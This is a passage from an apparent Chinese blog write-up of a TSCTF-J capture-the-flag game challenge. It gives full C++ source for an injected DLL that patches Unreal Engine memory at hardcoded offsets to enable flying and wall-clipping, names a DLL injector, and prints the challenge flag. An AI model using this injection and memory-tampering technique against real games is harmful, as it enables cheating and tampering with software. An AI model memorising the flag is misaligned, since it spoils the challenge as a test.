  &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>visual studio新建dll项目</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014221722121.png" alt="image-20251014221722121"></p>
<p>注意引如BasicType.h</p>
<p>然后生成项目</p>
<p>relase x64</p>
<p>然后找工具注入</p>
<p>如：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/DarthTon/Xenos">DarthTon&#x2F;Xenos: Windows dll injector</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211218244.png" alt="image-20251014211218244"></p>
<p>注入即可</p>
<p>按F6起飞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211202488.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211105377.png" alt="image-20251014211105377"></p>
<p>这里再添加一个脚本兼容穿墙和起飞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014222324466.png" alt="image-20251014222324466"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014223118044.png" alt="image-20251014223115885"></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BasicType.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UWorld</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UGameInstance</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ULocalPlayer</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APlayerController</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APawn</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ACharacter</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCharacterMovementComponent</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCapsuleComponent</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">FVector</span> &#123; <span class="type">float</span> X, Y, Z; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">EMovementMode</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    MOVE_None = <span class="number">0</span>,</span><br><span class="line">    MOVE_Walking = <span class="number">1</span>,</span><br><span class="line">    MOVE_NavWalking,</span><br><span class="line">    MOVE_Falling,</span><br><span class="line">    MOVE_Swimming,</span><br><span class="line">    MOVE_Flying,</span><br><span class="line">    MOVE_Custom</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">ECollisionEnabled</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    NoCollision = <span class="number">0</span>,</span><br><span class="line">    QueryOnly = <span class="number">1</span>,</span><br><span class="line">    PhysicsOnly = <span class="number">2</span>,</span><br><span class="line">    QueryAndPhysics = <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">uintptr_t</span> OFFSET_GWORLD = <span class="number">0x49EE370</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UWORLD_OWNING_GI = <span class="number">0x180</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UGAMEINSTANCE_LOCALPLAYERS = <span class="number">0x38</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ULOCALPLAYER_PLAYERCONTROLLER = <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_APLAYERCONTROLLER_ACKPAWN = <span class="number">0x2A0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_MOVEMENT = <span class="number">0x288</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_CAPSULE = <span class="number">0x290</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_MOVEMENTMODE = <span class="number">0x168</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE = <span class="number">0x384</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_PENDINGLAUNCH = <span class="number">0x3C0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_LASTUPDATEVELO = <span class="number">0x25C</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UPRIMITIVE_BODYINSTANCE = <span class="number">0x2C8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_FBODYINSTANCE_COLLISIONENABLED = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_running&#123; <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_userFly&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_autoFlyFromCollision&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_noCollision&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">uintptr_t</span> <span class="title">GetModuleBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">uintptr_t</span> base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uintptr_t</span>&gt;(::<span class="built_in">GetModuleHandleW</span>(<span class="literal">nullptr</span>));</span><br><span class="line">    <span class="keyword">return</span> base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UWorld* <span class="title">GetWorld</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UWorld**&gt;(<span class="built_in">GetModuleBase</span>() + OFFSET_GWORLD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UGameInstance* <span class="title">GetGameInstance</span><span class="params">(UWorld* world)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!world) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UGameInstance**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(world) + OFFSET_UWORLD_OWNING_GI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> TArray&lt;ULocalPlayer*&gt;&amp; <span class="title">GetLocalPlayers</span><span class="params">(UGameInstance* gi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">reinterpret_cast</span>&lt;TArray&lt;ULocalPlayer*&gt;*&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(gi) + OFFSET_UGAMEINSTANCE_LOCALPLAYERS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> APlayerController* <span class="title">GetPlayerController</span><span class="params">(ULocalPlayer* lp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;APlayerController**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(lp) + OFFSET_ULOCALPLAYER_PLAYERCONTROLLER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> ACharacter* <span class="title">GetAcknowledgedCharacter</span><span class="params">(APlayerController* pc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;ACharacter**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(pc) + OFFSET_APLAYERCONTROLLER_ACKPAWN);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCharacterMovementComponent* <span class="title">GetCharacterMovement</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCharacterMovementComponent**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_MOVEMENT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCapsuleComponent* <span class="title">GetCapsuleComponent</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCapsuleComponent**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_CAPSULE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyFlyState</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> enable, <span class="type">bool</span> giveBoost)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; defaultLand = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; pendingLaunch = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_PENDINGLAUNCH);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVel = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELO);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (enable) &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        defaultLand = EMovementMode::MOVE_Flying;</span><br><span class="line">        <span class="keyword">if</span> (giveBoost) &#123;</span><br><span class="line">            pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">800.f</span> &#125;;</span><br><span class="line">            lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">600.f</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">            lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        defaultLand = EMovementMode::MOVE_Walking;</span><br><span class="line">        pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SustainFly</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> giveBoost)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVel = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELO);</span><br><span class="line"></span><br><span class="line">    movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">    <span class="keyword">if</span> (giveBoost &amp;&amp; lastUpdateVel.Z &lt; <span class="number">300.f</span>) &#123;</span><br><span class="line">        lastUpdateVel.Z = <span class="number">400.f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyCollisionState</span><span class="params">(UCapsuleComponent* capsule, <span class="type">bool</span> noCollision)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!capsule) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* primitive = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(capsule);</span><br><span class="line">    <span class="keyword">auto</span>&amp; collisionEnabled = *<span class="built_in">reinterpret_cast</span>&lt;ECollisionEnabled*&gt;(</span><br><span class="line">        primitive + OFFSET_UPRIMITIVE_BODYINSTANCE + OFFSET_FBODYINSTANCE_COLLISIONENABLED);</span><br><span class="line"></span><br><span class="line">    collisionEnabled = noCollision ? ECollisionEnabled::NoCollision</span><br><span class="line">        : ECollisionEnabled::QueryAndPhysics;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ShouldFly</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> g_userFly.<span class="built_in">load</span>() || g_autoFlyFromCollision.<span class="built_in">load</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">FlyThread</span><span class="params">(LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (g_running) &#123;</span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F6) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            <span class="keyword">if</span> (!movement) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            g_userFly = !g_userFly.<span class="built_in">load</span>();</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, <span class="built_in">ShouldFly</span>(), g_userFly.<span class="built_in">load</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F5) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            <span class="keyword">auto</span> capsule = <span class="built_in">GetCapsuleComponent</span>(character);</span><br><span class="line">            <span class="keyword">if</span> (!movement || !capsule) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">bool</span> newState = !g_noCollision.<span class="built_in">load</span>();</span><br><span class="line">            g_noCollision = newState;</span><br><span class="line">            g_autoFlyFromCollision = newState;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">ApplyCollisionState</span>(capsule, newState);</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, <span class="built_in">ShouldFly</span>(), g_userFly.<span class="built_in">load</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            玩家切关、死亡重生、切换 Pawn 时，GWorld、GameInstance、LocalPlayers 乃至 AcknowledgedPawn 都可能变；</span></span><br><span class="line"><span class="comment">            如果只在按热键那一刻取一次指针，等角色重建后就指向旧对象，易崩溃或写不到新角色。</span></span><br><span class="line"><span class="comment">            循环里每次重新取 GWorld→GameInstance→LocalPlayer→PlayerController→Pawn→Movement/ Capsule，</span></span><br><span class="line"><span class="comment">            能在状态变化时自动跟上，确保对当前角色生效，也避免解引用野指针。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ShouldFly</span>() || g_noCollision.<span class="built_in">load</span>()) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (gi) &#123;</span><br><span class="line">                <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">                <span class="keyword">if</span> (players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) &amp;&amp; players[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (pc) &#123;</span><br><span class="line">                        <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character)) &#123;</span><br><span class="line">                            <span class="built_in">SustainFly</span>(movement, g_userFly.<span class="built_in">load</span>());</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">auto</span> capsule = <span class="built_in">GetCapsuleComponent</span>(character); g_noCollision.<span class="built_in">load</span>()) &#123;</span><br><span class="line">                            <span class="built_in">ApplyCollisionState</span>(capsule, <span class="literal">true</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">milliseconds</span>(<span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE <span class="keyword">module</span>, DWORD reason, LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        ::<span class="built_in">DisableThreadLibraryCalls</span>(<span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">MessageBoxW</span>(<span class="literal">nullptr</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF DLL 注入成功\nF6 切换飞行模式\nF5 切换穿墙模式&quot;</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF Helper&quot;</span>,</span><br><span class="line">            MB_OK | MB_ICONINFORMATION);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">CreateThread</span>(<span class="literal">nullptr</span>, <span class="number">0</span>, FlyThread, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (reason == DLL_PROCESS_DETACH) &#123;</span><br><span class="line">        g_running = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Flag：TSCTF-J{u0real_or_R1AL?!</p>
<p>还有一段flag找不到</p>
<p>只能看wp了</p>
<p>看了题解是藏在前面了_and_here}</p>
